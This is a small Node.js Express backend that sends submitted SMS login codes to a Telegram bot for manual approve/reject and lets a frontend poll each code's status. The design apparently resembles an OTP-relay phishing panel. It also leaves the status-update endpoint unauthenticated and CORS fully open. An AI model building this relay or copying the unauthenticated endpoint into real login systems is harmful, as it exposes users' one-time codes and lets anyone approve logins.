const express = require("express");
const cors = require("cors");
const bodyParser = require("body-parser");

const { sendApprovalRequestSMS } = require("./bot"); // import your Telegram bot function

const app = express();
const PORT = process.env.PORT || 3000;

// In-memory storage
const approvals = {}; // { code: "accepted" / "rejected" }

app.use(cors());
app.use(bodyParser.json());

// 1️⃣ Receive code from frontend and send Telegram buttons
app.post("/sms-login", (req, res) => {
  const { code } = req.body;
  if (!code) return res.status(400).json({ error: "Missing code" });

  approvals[code] = "pending"; // initialize status
  sendApprovalRequestSMS(code); // send Telegram buttons
  res.json({ success: true });
});

// 2️⃣ Frontend polls this endpoint to check status
app.get("/check-status", (req, res) => {
  const code = req.query.code;
  if (!code) return res.status(400).json({ error: "Missing code" });

  const status = approvals[code] || "pending";
  res.send(status); // returns "pending", "accepted", or "rejected"
});

// 3️⃣ Telegram bot updates status
app.post("/update-status", (req, res) => {
  const { code, status } = req.body;
  if (!code || !status) return res.status(400).json({ error: "Missing code or status" });

  approvals[code] = status;
  console.log(`✅ Code ${code} marked as ${status}`);
  res.json({ success: true });
});

// Health check
app.get("/", (req, res) => {
  res.send("✅ SMS Approval Backend is running");
});

app.listen(PORT, () => {
  console.log(`🚀 Server is running on port ${PORT}`);
});
